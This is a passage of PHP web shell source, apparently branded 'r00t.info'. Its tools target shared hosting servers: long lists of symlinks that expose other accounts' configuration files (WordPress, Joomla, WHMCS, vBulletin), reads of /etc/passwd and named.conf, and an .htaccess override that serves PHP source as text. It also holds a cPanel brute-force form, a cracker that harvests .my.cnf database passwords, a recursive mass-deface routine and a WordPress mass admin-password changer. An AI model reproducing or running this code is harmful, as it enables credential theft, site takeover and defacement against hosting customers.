        symlink('/home3/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home3/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home3/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home3/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home3/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home3/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home3/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home3/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home3/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home3/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home3/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
        symlink('/home4/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home4/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home4/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home4/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home4/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home4/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home4/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home4/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home4/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home4/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home4/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home4/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home4/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home4/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home4/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home4/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home4/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home4/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home4/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
        symlink('/home4/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home4/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home4/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home4/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home4/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home4/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home4/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home4/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home4/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home4/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home4/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
        symlink('/home5/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home5/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home5/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home5/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home5/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home5/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home5/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home5/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home5/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home5/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home5/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home5/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home5/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home5/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home5/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home5/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home5/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home5/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home5/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
        symlink('/home5/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home5/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home5/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home5/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home5/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home5/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home5/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home5/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home5/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home5/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home5/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
        symlink('/home6/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home6/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home6/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home6/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home6/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home6/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home6/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home6/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home6/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home6/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home6/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home6/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home6/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home6/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home6/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home6/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home6/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home6/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home6/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
        symlink('/home6/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home6/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home6/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home6/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home6/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home6/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home6/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home6/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home6/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home6/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home6/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
        symlink('/home7/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home7/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home7/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home7/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home7/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home7/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home7/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home7/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home7/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home7/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home7/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home7/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home7/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home7/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home7/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home7/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home7/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home7/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home7/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
        symlink('/home7/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home7/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home7/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home7/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home7/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home7/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home7/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home7/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home7/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home7/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home7/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
    }
    $d0mains = @file('/etc/named.conf');
    if ($d0mains) {
        mkdir($fn);
        chdir($fn);
        foreach ($d0mains as $d0main) {
            if (eregi('zone', $d0main)) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domains[1][0]));
                    syml($user['name'], $domains[1][0]);
                }
            }
        }
        echo '<center><font color=springgreen size=3>Done</font></center>';
        echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>";
    } else {
        mkdir($fn);
        chdir($fn);
        $temp = '';
        $val1 = 0;
        $val2 = 1000;
        for (; $val1 <= $val2; ++$val1) {
            $uid = @posix_getpwuid($val1);
            if ($uid) {
                $temp .= join(':', $uid) . "\n";
            }
        }
        echo '<br/>';
        $temp = trim($temp);
        $file5 = fopen('test.txt', 'w');
        fputs($file5, $temp);
        fclose($file5);
        $htaccess = 'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
			aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
			biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
			';
        $file = fopen('.htaccess', 'w+');
        $write = fwrite($file, base64_decode($htaccess));
        $file = fopen('test.txt', 'r') or exit('Unable to open file!');
        while (!feof($file)) {
            $s = fgets($file);
            $matches = [];
            $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
            $matches = str_replace('home/', '', $matches[1]);
            if (strlen($matches) > 12 || 0 == strlen($matches) || 'bin' == $matches || 'etc/X11/fs' == $matches || 'var/lib/nfs' == $matches || 'var/arpwatch' == $matches || 'var/gopher' == $matches || 'sbin' == $matches || 'var/adm' == $matches || 'usr/games' == $matches || 'var/ftp' == $matches || 'etc/ntp' == $matches || 'var/www' == $matches || 'var/named' == $matches) {
                continue;
            }
            syml($matches, $matches);
        }
        fclose($file);
        echo '</table>';
        unlink('test.txt');
        echo '<center><font color=springgreen size=3>Done</font></center>';
        echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>";
    }
    echo '<hr><center><b><a href=' . $_SERVER['PHP_SELF'] . '>BACK</a>';
    exit;
} ?>
			<form method="POST" target="_blank">
			<input name="page" type="hidden" value="find">
				<table border=1>
				<body bgcolor="black" text="white"><br><br>

				<center><b><font size="2" style="italic" color="white">Cpanel BruteForce<br><br></b></center></td></tr>
			    <tr>
			    <td>
				<strong>User :</strong>
				</td>
				<td>
				<strong><textarea cols="50" style="background:#191818;outline:none;color:white;" rows="5" name="usernames"><?php system('ls /var/mail'); ?></textarea></strong>
			    </td>
			    <tr>
			    <td>
				<strong>Pass :</strong>
				</td>
				<td>
			    <strong><textarea cols="50" style="background:#191818;outline:none;color:white;" rows="5" name="passwords"></textarea></strong>
				</td>
			    </tr>
			    <tr>
			    <td>
				<strong>Type :</strong>
				</td>
			    <td>
			    <span style="background:#191818;outline:none;color:white;"><strong>Simple : </strong> </span>
				<strong>
				<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
			    <font style="background:black;outline:none;color:white;"><strong>/etc/passwd : </strong> </font>
				<strong>
				<input type="radio" name="type" value="passwd" style="background:black;outline:none;color:white;"></strong><span class="style3"><strong>
				</strong>
				</span>
			    <td style="background:black;outline:none;color:white;"  >
			    <strong><input class ='bordergaya' type="submit" value="START"></strong>
			    </td>
			    </tr>
				</table>
				<br>
				<table border=1>
			</form>
			<tr>
			    <td style="background:black;outline:none;color:white;">
					<strong>Get Wordlist</strong>
			<form method="POST" target="_blank">
				<strong>
			<input name="pass" type="hidden" value="password">
			    </strong>
			    <strong>Url Config :</strong>
				<td>

			    <strong>
					<input style="background:black;outline:none;color:white;" size="80" name="url" type="text"></strong>

			    <td style="background:black;outline:none;color:white;"><strong><input class ='bordergaya' type="submit" value="GO">
			    </strong>
			    </td>
				</table>
                <?php  echo'<br/><br/>';
            // break;
            } elseif (isset($_GET['x']) && ('massde' == $_GET['x'])) { ?></center></center>
<style type="text/css">
	.ketengah{
	text-align: left;
	font-size: 16px;
	color: orange;
	font-family: Homenaje;
	margin-left: 30%;
</style>
<?php  function sabun_massal($path, $namafile, $isi_script)
            {
                if (is_writable($path)) {
                    $patha = scandir($path);
                    foreach ($patha as $pathb) {
                        $pathc = "$path/$pathb";
                        $lokasi = $pathc . '/' . $namafile;
                        if ('.' === $pathb) {
                            file_put_contents($lokasi, $isi_script);
                        } elseif ('..' === $pathb) {
                            file_put_contents($lokasi, $isi_script);
                        } else {
                            if (is_dir($pathc)) {
                                if (is_writable($pathc)) {
                                    echo "<font class='ketengah'><font color=crimson>-:-</font><font color=white>Sukses Bos Q</font><font color=crimson>-:-</font> <font color=springgreen>Cek di :</font> $lokasi</font><br>";
                                    file_put_contents($lokasi, $isi_script);
                                    $idx = sabun_massal($pathc, $namafile, $isi_script);
                                }
                            }
                        }
                    }
                }
            } if ($_POST['start']) {
                echo "<div style='margin: 5px auto; padding: 5px'>";
                sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                echo '</div>';
            } else {
                echo '<center>';
                echo "<form method='post'><br><br>
	<table>
	<tr>
		<td><font style='text-decoration: underline; margin-left:10px;'>Folder</font></td>
		<td align='center'>:</td>
		<td><input class='justborder' type='text' name='d_dir' value='$path' style='width: 95%;' height='10'><br></td>
	</tr>
	<tr>
		<td><font style='text-decoration: underline; margin-left:10px;'>Filename</font></td>
		<td align='center'>:</td>
		<td><input class='justborder' type='text' name='d_file' value='hacked.html' style='width: 95%;' height='10'><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><font style='text-decoration: underline;'>Script Deface : </font><br></td>
	</tr>
	<tr>
	<td colspan='3'><textarea class='justborder' name='script' style='width: 500px; height: 200px;'>Hacked by r00t.info!</textarea><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><input class='justborder' type='submit' name='start' value='Mass Deface' style='width: 50%;'><br/></td>
	</tr>
	</table><br><br><br>
	</form></center><br/>";
            }
// break;
?><center><center><?php } elseif (isset($_GET['x']) && ('mpc' == $_GET['x'])) { ?>
				<form action="?path=<?php echo $path; ?>&amp;x=mpc" method="post">
				<?php  set_time_limit(0); ini_set('display_errors', 0); echo '<center><h2>WordPress Mass Password Changer</h2><br /><br/></center>'; echo '<form method="POST" action="" >
			<center><table border="1" class="justborder"><tr><td>Config List:</td>
			<td><textarea class="justborder" name="url" cols="50" rows="10" ></textarea></td></tr>
			<tr><td>User/Password</td><td><input class="justborder" type="text" name="username" size="25" value="Psrmrh"> /
			<input class="justborder" type="text" name="password" size="25" value="stupidc0de"></td></tr></table>
			<br><input class="bordergaya" type="Submit" class="button" value="Submit"><input type="hidden" name="action" value="1"></form></center>'; if ('1' == $_POST['action']) {
    if ('' == $_POST['url']) {
        echo "<div class='result'>No CONFIG FOUND<br>Make sure you provided a config list!</div><br>";
    } else {
        $url = $_POST['url'];
        $users = explode("\n", $url);
        foreach ($users as $user) {
            $user1 = trim($user);
            $code = file_get_contents2($user1);
            preg_match_all('|define.*\(.*\'DB_NAME\'.*,.*\'(.*)\'.*\).*;|isU', $code, $b1);
            $db = $b1[1][0];
            preg_match_all('|define.*\(.*\'DB_USER\'.*,.*\'(.*)\'.*\).*;|isU', $code, $b2);
            $user = $b2[1][0];
            preg_match_all('|define.*\(.*\'DB_PASSWORD\'.*,.*\'(.*)\'.*\).*;|isU', $code, $b3);
            $db_password = $b3[1][0];
            preg_match_all('|define.*\(.*\'DB_HOST\'.*,.*\'(.*)\'.*\).*;|isU', $code, $b4);
            $host = $b4[1][0];
            preg_match_all('|\$table_prefix.*=.*\'(.*)\'.*;|isU', $code, $b5);
            $p = $b5[1][0];
            $d = @mysql_connect($host, $user, $db_password);
            if ($d) {
                @mysql_select_db($db);
                $usern = $_POST['username'];
                $passwd = $_POST['password'];
                $sql = 'UPDATE `' . $p . "users` SET `user_pass` = MD5( '" . $passwd . "' ) WHERE `ID` = '1';";
                @mysql_query($sql);
                $sql = 'UPDATE `' . $p . "users` SET `user_login` = '" . $usern . "' WHERE `ID` = '1';";
                @mysql_query($sql);
                $aa = @mysql_query('select option_value from `' . $p . "options` WHERE `option_name` = 'siteurl';");
                $siteurl = @mysql_fetch_array($aa);
                $siteurl = $siteurl['option_value'];
                $tr .= "$siteurl\n";
                mysql_close();
            }
        }
        if ($tr) {
            $filename = 'changed.txt';
        }
        $fp = fopen($filename, 'a+');
        $write = fputs($fp, $tr);
        fclose($fp);
        echo "<div class='result'>Password Changing Completed ! :)<br><br>";
        echo "<a href='changed.txt' target='_blank'>View List of Password Changed Sites</a></div><br/>";
    }
} function file_get_contents2($u)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $u);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0 ');
    $result = curl_exec($ch);

    return $result;
} echo '<br /><br />';
// break;
?>
				<?php } elseif (isset($_GET['x']) && ('masstool' == $_GET['x'])) {
    echo '<br/><br/>Monggo Pilih Toolsnya Bos Q ~_^<br/><br/>'; ?>
					<a href="?<?php echo 'path=' . $path; ?>&amp;x=massde"><input class=bordergaya type=submit value="Mass Deface" /></a>
					Or <a href="?<?php echo 'path=' . $path; ?>&amp;x=mpc"><input class=bordergaya type=submit value="Wordpress Mass Password Changer" /></a>
					Or <a href="?<?php echo 'path=' . $path; ?>&amp;x=zonesH"><input class=bordergaya type=submit value="Zone-H Mass Notifier" /></a>

                    <?php
                // break;
} elseif (isset($_GET['x']) && ('tentang' == $_GET['x'])) {
    echo"<br><br>
					<center><b>
			<font face='Jolly Lodger' color='white' size='6px'> [+] r<font color='teal'>00</font>.info [+]</font><br>
					<br>
			<font face='Fredericka The Great' color='white' size='3px'>&hearts; Respect Us, Little Crazy Family From Turkey ^_^  &hearts;<br><br>
			-:- No Leader We Just Laugh Together -:-</font><br><br>
			<font color='gray'> http://r00t.info/ </font><br><br><br>
			</center>
					</b>";
// break;
} elseif (isset($_GET['x']) && ('cpanel' == $_GET['x'])) {
    echo '<br/><br/>Monggo Pilih Toolsnya Bos Q ~_^<br/><br/>'; ?>

					<a href="?<?php echo 'path=' . $path; ?>&amp;x=brute"><input class=bordergaya type=submit value="Cpanel Bruteforce" /></a>
					Or <a href="?<?php echo 'path=' . $path; ?>&amp;x=cpcrack"><input class=bordergaya type=submit value="Auto Cpanel Finder/Cracker" /></a>
					<br/><br/><br/><br/>
                <?php
            // break;
            ?>

				<?php
} elseif (isset($_GET['x']) && ('cpcrack' == $_GET['x'])) { ?>
							<form action="?path=<?php echo $path; ?>&amp;x=cpcrack" method="post">
				<?php  @ini_set('display_errors', 0); function entre2v2($text, $marqueurDebutLien, $marqueurFinLien, $i = 1)
            {
                $ar0 = explode($marqueurDebutLien, $text);
                $ar1 = explode($marqueurFinLien, $ar0[$i]);

                return trim($ar1[0]);
            } echo '<h1>Cpanel Finder/Cracker</h1><br/>'; echo '<center>'; $d0mains = @file('/etc/named.conf'); $domains = scandir('/var/named'); if ($domains or $d0mains) {
                $domains = scandir('/var/named');
                if ($domains) {
                    echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
                    $count = 1;
                    $dc = 0;
                    $list = scandir('/var/named');
                    foreach ($list as $domain) {
                        if (strpos($domain, '.db')) {
                            $domain = str_replace('.db', '', $domain);
                            $owner = posix_getpwuid(fileowner('/etc/valiases/' . $domain));
                            $dirz = '/home/' . $owner['name'] . '/.my.cnf';
                            $path = getcwd();
                            if (is_readable($dirz)) {
                                copy($dirz, '' . $path . '/' . $owner['name'] . '.txt');
                                $p = file_get_contents('' . $path . '/' . $owner['name'] . '.txt');
                                $password = entre2v2($p, 'password="', '"');
                                echo '<tr><td>' . $count++ . "</td><td><a href='http://" . $domain . ":2082' target='_blank'>" . $domain . '</a></td><td>' . $owner['name'] . '</td><td>' . $password . "</td><td><a href='" . $owner['name'] . ".txt' target='_blank'>Click Here</a></td></tr>";
                                ++$dc;
                            }
                        }
                    }
                    echo '</table>';
                    $total = $dc;
                    echo '<br><div class="result">Total cPanel Found = ' . $total . '</h3><br />';
                    echo '</center>';
                } else {
                    $d0mains = @file('/etc/named.conf');
                    if ($d0mains) {
                        echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
                        $count = 1;
                        $dc = 0;
                        $mck = [];
                        foreach ($d0mains as $d0main) {
                            if (@eregi('zone', $d0main)) {
                                preg_match_all('#zone "(.*)"#', $d0main, $domain);
                                flush();
                                if (strlen(trim($domain[1][0])) > 2) {
                                    $mck[] = $domain[1][0];
                                }
                            }
                        }
                        $mck = array_unique($mck);
                        $usr = [];
                        $dmn = [];
                        foreach ($mck as $o) {
                            $infos = @posix_getpwuid(fileowner('/etc/valiases/' . $o));
                            $usr[] = $infos['name'];
                            $dmn[] = $o;
                        }
                        array_multisort($usr, $dmn);
                        $dt = file('/etc/passwd');
                        $passwd = [];
                        foreach ($dt as $d) {
                            $r = explode(':', $d);
                            if (strpos($r[5], 'home')) {
                                $passwd[$r[0]] = $r[5];
                            }
                        }
                        $l = 0;
                        $j = 1;
                        foreach ($usr as $r) {
                            $dirz = '/home/' . $r . '/.my.cnf';
                            $path = getcwd();
                            if (is_readable($dirz)) {
                                copy($dirz, '' . $path . '/' . $r . '.txt');
                                $p = file_get_contents('' . $path . '/' . $r . '.txt');
                                $password = entre2v2($p, 'password="', '"');
                                echo '<tr><td>' . $count++ . "</td><td><a target='_blank' href=http://" . $dmn[$j - 1] . '/>' . $dmn[$j - 1] . ' </a></td><td>' . $r . '</td><td>' . $password . "</td><td><a href='" . $r . ".txt' target='_blank'>Click Here</a></td></tr>";
                                ++$dc;
                                flush();
                                $l = $l ? 0 : 1;
                                ++$j;
                            }
                        }
                    }
                    echo '</table>';
                    $total = $dc;
                    echo '<br><h3>Total cPanel Found = ' . $total . '</h3><br />';
                    echo '</center>';
                }
            } else {
                echo "<h3><i><font color='red'>ERROR</font><br><font color='red'>/var/named</font> or <font color='red'>etc/named.conf</font> Not Accessible!</i></h3>";
            } echo '</body></html>';
// break;
} elseif (isset($_GET['x']) && ('vn' == $_GET['x'])) { ?>
					<form action="?path=<?php echo $path; ?>&amp;x=vn" method="post">
					<center><h2>Domain Viewer</h2></center><br><br>
					<?php  function openBaseDir()
{
    $openBaseDir = ini_get('open_basedir');
    if (!$openBaseDir) {
        $openBaseDir = '<font color="green">OFF</font>';
    } else {
        $openBaseDir = '<font color="red">ON</font>';
    }

    return $openBaseDir;
} echo '
				    <table width="95%" cellspacing="0" cellpadding="0"  >
				    <td height="100" align="left" >'; $pg = basename(__FILE__); $safe_mode = @ini_get('safe_mode'); $dir = @getcwd(); @mkdir('pee', 0777); @symlink('/', 'pee/root'); $htaccss = 'Options all
				 DirectoryIndex Sux.html
				 AddType text/plain .php
				 AddHandler server-parsed .php
				  AddType text/plain .html
				 AddHandler txt .html
				 Require None
				 Satisfy Any'; file_put_contents('pee/.htaccess', $htaccss); $etc = file_get_contents('/etc/passwd'); $etcz = explode("\n", $etc); foreach ($etcz as $etz) {
    $etcc = explode(':', $etz);
    error_reporting(0);
    $current_dir = posix_getcwd();
    $dir = explode('/', $current_dir);
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/wp-config.php', 'pee/' . $etcc[0] . '-WordPress.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/blog/wp-config.php', 'pee/' . $etcc[0] . '-WordPress.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/wp/wp-config.php', 'pee/' . $etcc[0] . '-WordPress.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/site/wp-config.php', 'pee/' . $etcc[0] . '-WordPress.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/config.php', 'pee/' . $etcc[0] . '-PhpBB.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/includes/config.php', 'pee/' . $etcc[0] . '-vBulletin.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/configuration.php', 'pee/' . $etcc[0] . '-Joomla.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/web/configuration.php', 'pee/' . $etcc[0] . '-Joomla.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/joomla/configuration.php', 'pee/' . $etcc[0] . '-Joomla.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/site/configuration.php', 'pee/' . $etcc[0] . '-Joomla.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/conf_global.php', 'pee/' . $etcc[0] . '-IPB.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/inc/config.php', 'pee/' . $etcc[0] . '-MyBB.txt');
